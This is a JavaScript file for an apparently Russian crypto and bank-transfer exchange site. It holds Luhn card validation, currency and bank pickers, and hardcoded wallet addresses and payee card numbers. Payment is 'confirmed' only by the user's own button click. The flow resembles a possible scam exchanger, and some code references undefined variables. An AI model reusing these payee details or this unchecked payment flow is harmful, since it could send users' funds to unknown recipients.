// GiraffeWeb Алгоритм Луна
function luhnAlgorithm(digits) {
  let sum = 0;
  for (let i = 0; i < digits.length; i++) {
    let cardNum = parseInt(digits[i]);
    if ( i % 2 === 0) {
      cardNum = cardNum * 2;
      if (cardNum > 9) {
        cardNum = cardNum - 9;
      }
    }
    sum += cardNum;
  }
  return sum % 10 === 0;
}

// GiraffeWeb Валидация реквизитов карты
function validate(num) {
var num = document.getElementById('requisites_second').value;
// console.log(num);
// console.log(luhnAlgorithm(num));
if(luhnAlgorithm(num) == true && num !== '' && num.length >= 15) {
swal("Карта успешно добавлена!", "", "success");
return x = true;
} else {
    swal({
  title: "Данные вашей карты некорректны",
  content: {
    element: "a",
    attributes: {
      text: "Есть вопросы? Обратитесь к нам",
      href: "https://t.me/smallcommision",
    },
  },
  icon: "error",
  button: "ОК",
});
}
}
// GiraffeWeb Реквизиты стандартного кошелька
var pay_money = '1EoKrTM5dCspZt9cFkc454pFUZgmJeTJii';
// GiraffeWeb Переменная банка, пустое значение до выбора
var bank = 'Сбер';
// GiraffeWeb Выбор валют
function btc(e) {
    pay_money = '1EoKrTM5dCspZt9cFkc454pFUZgmJeTJii';
    swal({
    title: "Валюта выбрана",
    text: "BTC (Legacy)",
    icon: "http://smallcommission.su/img/sybmol/bitcoin.svg",
  });
    return pay_money;
}
function usdt() {
    pay_money = 'TKiMgJt38NHJUzB3r9pGgyTeqsX4yPS3Ej';
    swal({
    title: "Валюта выбрана",
    text: "USDT (TRC20)",
    icon: "http://smallcommission.su/img/sybmol/tether.svg",
  });
    return pay_money;
}
function usdc20() {
    pay_money = '0x7f63a6f17196Cb4aa4789E7dDC842E8e3602b269';
    swal({
    title: "Валюта выбрана",
    text: "USDC (BEP20)",
    icon: "http://smallcommission.su/img/sybmol/usd_coin.svg",
  });
    return pay_money;
}
function busd() {
    pay_money = '0x7f63a6f17196Cb4aa4789E7dDC842E8e3602b269';
    swal({
    title: "Валюта выбрана",
    text: "BUSD",
    icon: "http://smallcommission.su/img/sybmol/binance_usd.svg",
  });
    return pay_money;
}
function bnb20() {
    pay_money = '0x7f63a6f17196Cb4aa4789E7dDC842E8e3602b269';
    swal({
    title: "Валюта выбрана",
    text: "BNB (BEP20)",
    icon: "http://smallcommission.su/img/sybmol/binance_coin.svg",
  });
    return pay_money;
}
function bnb2() {
    pay_money = 'bnb19ft6alpvf43gzt9zamj6lustw5sa4pwxa5ck4e';
    swal({
    title: "Валюта выбрана",
    text: "BNB (BEP2)",
    icon: "http://smallcommission.su/img/sybmol/binance_coin.svg",
  });
    return pay_money;
}
function xrp() {
    pay_money = 'rrnqxQzdeKpNNwmENeUaDxsa3fBq45xycg';
    swal({
    title: "Валюта выбрана",
    text: "XRP",
    icon: "http://smallcommission.su/img/sybmol/ripple.svg",
  });
    return pay_money;
}
function xrp20() {
    pay_money = '0x7f63a6f17196Cb4aa4789E7dDC842E8e3602b269';
    swal({
    title: "Валюта выбрана",
    text: "XRP (BEP20)",
    icon: "http://smallcommission.su/img/sybmol/ripple.svg",
  });
    return pay_money;
}
function xrp2() {
    pay_money = 'bnb19ft6alpvf43gzt9zamj6lustw5sa4pwxa5ck4e';
    swal({
    title: "Валюта выбрана",
    text: "XRP (BEP2)",
    icon: "http://smallcommission.su/img/sybmol/ripple.svg",
  });
    return pay_money;
}
function eth() {
    pay_money = '0x7f63a6f17196Cb4aa4789E7dDC842E8e3602b269';
    swal({
    title: "Валюта выбрана",
    text: "ETH (ERC20)",
    icon: "http://smallcommission.su/img/sybmol/ethereum.svg",
  });
    return pay_money;
}
function trx() {
    pay_money = 'TKiMgJt38NHJUzB3r9pGgyTeqsX4yPS3Ej';
    swal({
    title: "Валюта выбрана",
    text: "TRX",
    icon: "http://smallcommission.su/img/sybmol/tron.svg",
  });
    return pay_money;
}
function sber() {
    bank = 'Сбер';
    swal({
    title: "Банк выбран",
    text: "Сбер",
    icon: "http://smallcommission.su/img/sybmol/sber.png",
  });
    return bank;
}
function tinkof() {
    bank = 'Тинькофф';
    swal({
    title: "Банк выбран",
    text: "Тинькофф",
    icon: "http://smallcommission.su/img/sybmol/tinkof.png",
  });
    return bank;
}
function alfabank() {
    bank = 'Альфа-банк';
    swal({
    title: "Банк выбран",
    text: "Альфа-банк",
    icon: "http://smallcommission.su/img/sybmol/alfabank.png",
  });
    return bank;
}
function vtb() {
    bank = 'ВТБ';
    swal({
    title: "Банк выбран",
    text: "ВТБ",
    icon: "http://smallcommission.su/img/sybmol/vtb.png",
  });
    return bank;
}
function raifaizen() {
    bank = 'Райффайзен';
    swal({
    title: "Банк выбран",
    text: "Райффайзен",
    icon: "http://smallcommission.su/img/sybmol/raifaizen.png",
  });
    return bank;
}
function gazprombank() {
    bank = 'Газпромбанк';
    swal({
    title: "Банк выбран",
    text: "Газпромбанк",
    icon: "http://smallcommission.su/img/sybmol/gazprombank_logo.png",
  });
    return bank;
}
function otkritie() {
    bank = 'Открытие';
    swal({
    title: "Банк выбран",
    text: "Открытие",
    icon: "http://smallcommission.su/img/sybmol/otkritie.png",
  });
    return bank;
}
function bankofamerica() {
    bank = 'Bank of America';
    swal({
    title: "Банк выбран",
    text: "Bank of America",
    icon: "http://smallcommission.su/img/sybmol/bankofamerica_logo.png",
  });
    return bank;
}
// GiraffeWeb Осуществление перевода
function pay() {
    var first = document.getElementById('price').value;
    var fio = document.getElementById('fio').value;
    var email = document.getElementById('email').value;
    var requisites = document.getElementById('requisites').value;

    if (first !== ''  && fio !== '' && email !== '' && requisites !== '') {
        if (first < 20) {
            swal({
            title: "Платёж можно совершить только от 20$",
            content: {
            element: "a",
            attributes: {
            text: "Есть вопросы? Обратитесь к нам",
            href: "https://t.me/smallcommision",
             },
            },
            icon: "error",
            button: "ОК",
            });

        } 
        
        else {
        var numberRequest = function() {
        return Math.floor(Math.random() * 99);
        }
        var number = numberRequest();
    
        if (first !== '') {
        price = first + '$';
        } else {
        price = 'Нет данных';
        }
        
        if (bank !== '') {
        bank_name = bank;
        } else {
        bank_name = 'Нет данных';
        }
        var span = document.createElement("span");
span.innerHTML = '<span style="font-size:20px;"> <b style="color:#4a4a4a">Заявка №' + number + '</b>: <span style="color:blue">В процессе</span> </span> <br><br> <span style="color:#4a4a4a">Вам дано 19 минут, чтобы совершить транзакцию. <br><br>Сумма транзакции: ' + price + ' (' + sum + '₽)' + '<br><span style="color:#4a4a4a">Банковская организация: ' + bank_name + '<br><hr><p style="font-size:15px;text-align:center;color:#4a4a4a">Номер кошелька:<br><span style="font-size:10px;">' + pay_money;

swal({
    content: span,
    buttons: {
    cancel: "Отменить",
    catch: {
      text: "Оплата произведена",
      value: "true",
    },
  },
})
.then((value) => {
  switch (value) {
 
    case "true":
        swal("Отлично!", "Осталось нажать 'Завершить транзакцию'.", "success");
        break;
        default:
  }
});
;
        }
    } else {
    swal({
    title: "Вы не заполнили все данные",
    content: {
    element: "a",
    attributes: {
      text: "Есть вопросы? Обратитесь к нам",
      href: "https://t.me/smallcommision",
        },
    },
    icon: "error",
    button: "ОК",
    });
    } 

}

// GiraffeWeb Реквизиты стандартного кошелька
var valute_second = 'Не выбрана';
// GiraffeWeb Переменная банка, пустое значение до выбора
var bank = '';
// GiraffeWeb Выбор валют
function btc_second(e) {
    valute_second = 'BTC';
    swal({
    title: "Валюта выбрана",
    text: "BTC",
    icon: "http://smallcommission.su/img/sybmol/bitcoin.svg",
  });
    return valute_second;
}
function usdt_second() {
    valute_second = 'USDT';
    swal({
    title: "Валюта выбрана",
    text: "USDT (TRC20)",
    icon: "http://smallcommission.su/img/sybmol/tether.svg",
  });
    return valute_second;
}
function usdc20_second() {
    valute_second = 'USDC';
    swal({
    title: "Валюта выбрана",
    text: "USDC (BEP20)",
    icon: "http://smallcommission.su/img/sybmol/usd_coin.svg",
  });
    return valute;
}
function busd_second() {
    valute_second = 'BUSD';
    swal({
    title: "Валюта выбрана",
    text: "BUSD",
    icon: "http://smallcommission.su/img/sybmol/binance_usd.svg",
  });
    return valute_second;
}
function bnb20_second() {
    valute_second = 'BNB';
    swal({
    title: "Валюта выбрана",
    text: "BNB (BEP20)",
    icon: "http://smallcommission.su/img/sybmol/binance_coin.svg",
  });
    return valute_second;
}
function xrp_second() {
    valute_second = 'XRP';
    swal({
    title: "Валюта выбрана",
    text: "XRP",
    icon: "http://smallcommission.su/img/sybmol/ripple.svg",
  });
    return valute_second;
}
function trx_second() {
    valute_second = 'TRX';
    swal({
    title: "Валюта выбрана",
    text: "TRX",
    icon: "http://smallcommission.su/img/sybmol/tron.svg",
  });
    return valute_second;
}
pay_money_second = '5469380057289067';
function sber_second() {
  bank = 'Сбер';
  swal({
  title: "Банк выбран",
  text: "Сбер",
  icon: "http://smallcommission.su/img/sybmol/sber.png",
});
  return bank;
}
function tinkof_second() {
  bank = 'Тинькофф';
  pay_money_second = '5536913997420308';
  swal({
  title: "Банк выбран",
  text: "Тинькофф",
  icon: "http://smallcommission.su/img/sybmol/tinkof.png",
});
  return bank, pay_money_second;

}
// GiraffeWeb Осуществление покупки валют
function pay_second() {
    var first_second = document.getElementById('price_second').value;
    var fio_second = document.getElementById('fio_second').value;
    var email_second = document.getElementById('email_second').value;
    var requisites_second = document.getElementById('requisites_second').value;

    if (luhnAlgorithm(requisites_second) == true) {
    if (first_second !== '' && fio_second !== '' && email_second !== '' && requisites_second !== '') {
        if (first_second < 1 ) {
            swal({
            title: "Покупку можно совершить только от 1$",
            content: {
            element: "a",
            attributes: {
            text: "Есть вопросы? Обратитесь к нам",
            href: "https://t.me/smallcommision",
             },
            },
            icon: "error",
            button: "ОК",
            });

        } 
        
        else {
    
        var numberRequest = function() {
        return Math.floor(Math.random() * 99);
        }
        var number = numberRequest();
    
        if (first_second !== '') {
        price_second = first_second + '$';
        } else {
        price_second = 'Нет данных';
        }
        
        if (bank !== '') {
        bank_name = bank;
        } else {
        bank_name = 'Сбер';
        }
        var span = document.createElement("span");
span.innerHTML = '<span style="font-size:20px;"> <b style="color:#4a4a4a">Заявка №' + number + '</b>: <span style="color:blue;">В процессе</span> </span> <br><br> <span style="color:#4a4a4a">Вам дано 19 минут, чтобы совершить транзакцию.</span> <br><br><span style="color:#4a4a4a">Сумма транзакции: ' + price_second + ' (' + sum_second + '₽)' + '<br><span style="color:#4a4a4a">Валюта: ' + valute_second + '<hr><span style="color:#4a4a4a">Банковская организация: ' + bank_name +'<p style="font-size:15px;text-align:center;color:#4a4a4a">Номер кошелька:<br>' + pay_money_second;

swal({
    content: span,
    buttons: {
    cancel: "Отменить",
    catch: {
      text: "Оплата произведена",
      value: "true",
    },
  },
})
.then((value) => {
  switch (value) {
 
    case "true":
      swal("Отлично!", "Осталось нажать 'Завершить покупку'.", "success");
      break;
 
    default:
  }
});
;
        }
    } else {
    swal({
    title: "Вы не заполнили все данные",
    content: {
    element: "a",
    attributes: {
      text: "Есть вопросы? Обратитесь к нам",
      href: "https://t.me/smallcommision",
        },
    },
    icon: "error",
    button: "ОК",
    });
    } 

  } else {
    swal({
    title: "Данные вашей карты некорректны",
    content: {
    element: "a",
    attributes: {
      text: "Есть вопросы? Обратитесь к нам",
      href: "https://t.me/smallcommision",
        },
    },
    icon: "error",
    button: "ОК",
    });
    }

    }

// GiraffeWeb Завершение операций
function finish() {
    var first = document.getElementById('price').value;
    var fio = document.getElementById('fio').value;
    var email = document.getElementById('email').value;
    var requisites = document.getElementById('requisites').value;
    if (first !== '' && bank !== '' && fio !== '' && email !== '' && x == true) {
        
    } else {
    
    swal({
    title: "Заполните корректно все данные",
    content: {
    element: "a",
    attributes: {
      text: "Есть вопросы? Обратитесь к нам",
      href: "https://t.me/smallcommision",
        },
    },
    icon: "error",
    button: "ОК",
    });
    }
}
